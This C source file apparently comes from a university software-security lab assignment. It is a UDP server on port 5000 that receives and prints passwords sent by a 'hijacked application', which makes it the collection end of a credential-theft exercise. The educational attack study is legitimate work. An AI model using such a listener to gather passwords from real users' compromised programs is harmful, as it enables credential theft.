/*
 *  Introduction to Software Security Assignment (Laboratory) 1 
 *  Server program
 *  Copyright (C) 2023  Roy Simanovich
 * 
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 * 
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

/*
 * @brief Server port number
 *
 * @note This port number must be the same as the one used in the hijacked
 *          application.
 * @note The default port number is 5000.
*/
#define SRV_PORT 5000

/*
 * @brief A server program that receives the password from the hijacked
 *          application.
 * 
 * @param void No arguments are passed to the program.
 *
 * @return 0 on success, 1 on failure.
 * 
 * @note This program must be run before the hijacked application.
*/
int main(void) {
    struct sockaddr_in srv_addr, cli_addr;

    char password[1000] = { 0 };

    socklen_t cli_addr_len = 0;

    int sockfd = -1, reuse = 1;

    fprintf(stdout, "Starting server...\n");

    memset(&srv_addr, 0, sizeof(srv_addr));
    memset(&cli_addr, 0, sizeof(cli_addr));

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    srv_addr.sin_port = htons(SRV_PORT);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        fprintf(stderr, "socket() failed: %s\n", strerror(errno));
        exit(1);
    }

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0)
    {
        fprintf(stderr, "setsockopt() failed: %s\n", strerror(errno));
        exit(1);
    }

    if (bind(sockfd, (struct sockaddr*) &srv_addr, sizeof(srv_addr)) < 0)
    {
        fprintf(stderr, "bind() failed: %s\n", strerror(errno));
        exit(1);
    }

    fprintf(stdout, "Waiting for password...\n");

    while(1)
    {
        int bytes = 0;

        bzero(password, sizeof(password));

        if ((bytes = recvfrom(sockfd, password, sizeof(password), 0, (struct sockaddr*) &cli_addr, &cli_addr_len)) < 0)
        {
            fprintf(stderr, "recvfrom() failed: %s\n", strerror(errno));
            exit(1);
        }

        fprintf(stdout, "From: %s:%d received %d bytes\n", inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port), bytes);
        fprintf(stdout, "Password: %s\n\n", password);
    }

    fprintf(stdout, "Closing server...\n");

    close(sockfd);

    return 0;
}